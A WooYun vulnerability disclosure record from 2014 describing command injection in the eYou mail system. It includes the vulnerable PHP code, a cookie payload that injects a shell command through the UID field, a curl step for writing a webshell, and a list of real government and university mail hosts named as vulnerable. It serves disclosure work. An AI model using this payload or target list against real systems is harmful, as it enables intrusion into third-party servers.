{"id": 2806, "wybug_id": "wooyun-2014-058301", "wybug_title": "亿邮邮件系统命令执行漏洞(大量邮件系统沦陷实例)", "wybug_corp": "北京亿中邮信息技术有限公司", "wybug_author": "pangshenjie", "wybug_date": "2014-04-24 18:05", "wybug_open_date": "2014-07-23 18:44", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["命令执行", "亿邮"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： 涉及到的应该是亿邮v4版本的。互联网仍有大量实例。 详细说明：  poc:利用：/user/list.php 爆路径然后cookie内USER修改为如下：\nUID=1+|+echo+test+>>/路径/xxx.txt\neyou邮件系统早期版本中存在大量的exec().system() ``等敏感可能导致命令执的敏感函数和代码其中，/inc/function.php 中存在如下代码：function getUserDirPath($uid, $domain) {    $cmd = \"/var/eyou/sbin/hashid $uid $domain\";    $path = `$cmd`; //使用反引号导致$cmd可以被执行    $path = trim($path);    return $path;}search了一下，在/user/storage_explore.php 中调用该函数：$skin               = getCookieUserValue('SKIN');$uid                = getCookieUserValue('UID'); $domain             = getCookieUserValue('DOMAIN');$user_dir_path      = getUserDirPath($uid, $domain);$storage_index_path = $user_dir_path.'/storage/Index/';$storage_data_path  = $user_dir_path.'/storage/Data/';$userinfo = get_userinfo($uid , $domain);$uid , $domain 分别都是getCookieUserValue 函数来获取的，该函数也在function.php中定义：function getCookieUserValue($key) {    $user_arr = explode('&', cookie('USER'));    $n = count($user_arr);    for ($i = 0; $i < $n; $i++) {        $g_arr = explode('=', $user_arr[$i]);        if ($g_arr[0] == $key) {            return $g_arr[1];        }    }    return null;}然后就可以呵呵呵了。控制cookie中USER内容中UID=+|+echo+123+>>/tmp/xxx.txt 即可执行命令。另外厂商还附送了一枚爆路径：/user/list.php攻击者完全可以利用此处获取webshell控制系统   漏洞证明：  /user/storage_fold_explore.php/user/storage_explore.php控制cookie 中 USER字段的值：UID=1+|+patload\n\n\n\n爆路径：\n\n另外测试的一个站发现开了gpc了。echo写shell的时候里面的尖括号等符号需要转义，而转义符号又会被gpc再转义一次。so，可以 curl http：//xxx.com/ >>path/shell.php 写shell。虽然应该涉及到的不是eyou最新版本，但是网上依然可以找到大量实例，google：intitle:亿邮通讯 前几页就找到不少（另外应该还有不少改了关键字的）：http://mail.sihs.edu.cn/user/storage_explore.phphttp://mail.bjsasc.com/user/storage_explore.phphttp://cma.org.cn/user/storage_explore.phphttp://gzlps.gov.cn/user/storage_explore.phphttp://mail.bjtsb.gov.cn/user/storage_explore.phphttp://mail.ynfda.gov.cn/user/storage_explore.phphttp://mail.sihs.edu.cn/user/storage_explore.phphttp://mail.gzhmc.edu.cn/user/storage_explore.phphttp://mail.ynjcy.gov.cn/user/storage_explore.phphttp://mail.whuh.com/user/storage_explore.phphttp://mail.baoshan.gov.cn/user/storage_explore.phphttp://mail.huayou.com/user/storage_explore.phphttp://mail.glzx.net/user/storage_explore.phphttp://mail.workercn.cn/user/storage_explore.phphttp://mail.ynfda.gov.cn/user/storage_explore.phphttp://mail.lijiang.cn/user/storage_explore.phphttp://mail.gduf.edu.cn/user/storage_explore.phphttp://mail.wnu.edu.cn/user/storage_explore.phphttp://mail.xsbn.gov.cn/user/storage_explore.phphttp://mail.jxrtvu.com/user/storage_explore.phphttp://mail.yn.gov.cn/user/storage_explore.phphttp://mail.nbcc.cn/user/storage_explore.phphttp://www.bhhco.com/user/storage_explore.phphttp://221.199.11.171/user//storage_explore.phphttp://www.bhl.net.cn/user//storage_explore.phphttp://mail.xsbn.gov.cn/user/storage_explore.phphttp://mail.ynagri.gov.cn/user/storage_explore.phphttp://mail.yngzw.gov.cn/user/storage_explore.php http://mail.zlvc.edu.cn/user/storage_explore.phphttp://www.wxjd.com.cn:8080/user/storage_explore.phphttp://email.cin.gov.cn/user/storage_explore.phphttp://mail.ynppb.gov.cn/user/storage_explore.phphttp://mail.sdhyxy.com/user/storage_explore.phphttp://m.zime.edu.cn/user/storage_explore.phphttp://mail.jsjzi.edu.cn/user/storage_explore.phphttp://mail.mastvu.ah.cn/user/storage_explore.phphttp://mail.ynnic.gov.cn//user/storage_explore.phphttp://mail.xys.gov.cn/user/storage_explore.phphttp://mail.ynbtv.cn/user/storage_explore.phphttp://mail.cxdrc.gov.cn/user/storage_explore.phphttp://mail.tjha.cn/user/storage_explore.phphttp://mail.zzvcom.com/user/storage_explore.phphttp://mail.jku.cn/user/storage_explore.phphttp://www.sit.com.cn:802/user/storage_explore.phphttp://mail.cein.gov.cn/user/storage_explore.phphttp://email.10050.net/user/storage_explore.phphttp://mail.zjiet.edu.cn/user/storage_explore.phphttp://mail.tianhe.com/user/storage_explore.phphttp://ms.sytu.edu.cn/user/storage_explore.phphttp://mail.hao1818.com/user/storage_explore.phphttp://mail.sxky.cn/user/storage_explore.phphttp://mail.cnxw.com.cn/user/storage_explore.phphttp://mail.yongren.gov.cn/user/storage_explore.phphttp://mail.mdx.gov.cn/user/storage_explore.phphttp://mail.bofcom.gov.cn/user/storage_explore.phphttp://mail.nanning.gov.cn/user/storage_explore.phphttp://mail.ahgzw.gov.cn/user/storage_explore.phphttp://mail.wtec.com.cn/user/storage_explore.phphttp://mail.chu.edu.cn/user/storage_explore.phphttp://210.43.128.17/user/storage_explore.php   修复方案：  你懂的   版权声明：转载请注明来源 pangshenjie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-04-29 09:26 厂商回复： CNVD确认并复现所述情况，在改写无害化检测脚本后对相关服务器进行巡检，至26日发现有338台服务器受到影响，根据测试用例情况，转由CNCERT分别向分中心以及重要行业单位通报。漏洞情况已经先期发给亿中邮公司，待其发布补丁。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-24 18:06 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  又是个大奖啊    \n     2014-04-24 18:10 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  火钳刘明    \n     2014-04-24 18:57 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @疯狗 目测是这个：http://loudong.360.cn/vul/info/id/5778    \n     2014-04-24 19:03 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @U神 不明觉厉    \n     2014-04-24 19:29 |    \t\t我是壮丁  \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专业打酱油)\t\t \n  速度围观啊    \n     2014-04-24 20:15 |    \t\t不进则退 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 慢慢成长，不进则退。)\t\t \n  @疯狗终于可以和大神并肩了，吼吼～～其实我是看到你才决心来这里滴，    \n     2014-04-24 20:21 |    \t\tAnymous \t\t\t( 普通白帽子  |\t\t\t        Rank:124 漏洞数:28        )\t\t \n  你等何须读典坟，若见中丞忽相问，不忧家国任奸臣，吊影徘徊独愁暮。那堪雨后更闻蝉，能令百二山河主，得意引杯须痛饮，了却人间婚嫁事。    \n     2014-04-24 20:29 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  mark，明天比对一下。    \n     2014-04-24 23:07 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @U神 目测是那边给少了，哈哈    \n     2014-04-24 23:52 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @不进则退 你匿名提交漏洞了？    \n     2014-04-25 07:06 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  为毛 我总是照不到这个的源码。。求一份。    \n     2014-04-25 08:59 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  哈哈未同意啊    \n     2014-04-25 11:17 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  带$$$是发钱的意思吧    \n     2014-04-25 11:17 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  我靠！￥￥￥ 是啥意思。。。    \n     2014-04-25 11:18 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  很多钱的意思    \n     2014-04-25 11:26 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  怎么变成2个$$    \n     2014-04-25 11:30 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  我也是刷新了下 看到了~ - -   如果和360那个人是一个人的话  那俩边都能拿钱啊~   好特么的机智啊！    \n     2014-04-25 11:33 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  看来我要转型了    \n     2014-04-25 11:34 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @浩天 新功能上线，体现出通用型漏洞的奖励，但这个$的数量不直接代表多少奖励（但奖励确实与等级挂钩），而是应用影响等级，尽量不搞的复杂，所以刚刚微调了下    \n     2014-04-25 11:37 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @疯狗 ￥￥用这个好唉，$$不是美刀嘛    \n     2014-04-25 11:38 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  这是被钱给砸了么    \n     2014-04-25 13:36 |    \t\tnextdoor \t\t\t( 普通白帽子  |\t\t\t        Rank:325 漏洞数:74        )\t\t \n  @疯狗 这和精华贴有啥区别    \n     2014-04-25 13:40 |    \t\t不进则退 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 慢慢成长，不进则退。)\t\t \n  @疯狗是啊，只敢提交小的，大的怕，不敢提交咋办？    \n     2014-04-25 13:47 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  已经先行向厂商通报，后续的用户案例检测已经在进行，目前改写出低害化检测脚本。    \n     2014-04-25 14:06 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  一直在调这儿美元符号，压缩了更难看了    \n     2014-04-25 14:13 |    \t\t神奇=路人甲 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 神奇=路人甲=神奇=bug)\t\t \n  这回弄大了！    \n     2014-04-25 14:16 |    \t\tMyKings \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:24        )\t\t \n  @Anymous 你若不吊那能得了~ ^_^    \n     2014-04-25 14:28 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  $$是啥意思？发米？    \n     2014-04-25 17:10 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @疯狗 。狗哥 这个昨天才提交 今天就能有钱?          不是要最少就要10天左右评级么。    \n     2014-04-25 17:19 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @′  雨。 机制一点点的在改么，慢不是现在最大问题么，尝试看看咋搞。    \n     2014-04-25 19:01 |    \t\tnoah \t\t\t( 普通白帽子  |\t\t\t        Rank:384 漏洞数:40        )\t\t \n  有$$...    \n     2014-04-29 09:45 |    \t\tylaxfcy \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:28        | 技术无黑白，但是人有)\t\t \n  2k到手，耦合和    \n     2014-04-29 11:00 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @疯狗   看来这种速度还是对 重点/一般应用的才有这种速度啊，    \n     2014-04-29 11:00 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @′  雨。 提速的一个尝试    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}